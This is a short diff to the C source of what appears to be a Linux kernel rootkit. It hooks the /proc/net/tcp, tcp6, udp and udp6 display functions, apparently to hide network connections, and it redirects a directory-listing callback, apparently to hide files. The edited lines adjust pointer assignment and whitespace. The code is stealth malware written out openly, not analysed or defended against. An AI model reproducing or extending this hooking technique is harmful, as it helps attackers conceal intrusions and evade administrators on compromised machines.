@@ -909,7 +909,8 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 	    int ret; \
 	    int (*original_iterate)(struct file *, struct dir_context *); \
             original_##NAME##_filldir = context->actor; \
-            *((filldir_t*)&context->actor) = NAME##_filldir; \
+            //*((filldir_t*)&context->actor) = NAME##_filldir; \
+	    context->actor = NAME##_filldir; \
             \
             original_iterate = asm_hook_unpatch(NAME##_iterate); \
             ret = original_iterate(file, context); \
@@ -1209,8 +1210,7 @@ int init(void)
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
     asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
-    asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);
-	
+    asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);	
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
       LINUX_VERSION_CODE < KERNEL_VERSION(3, 3, 0) 
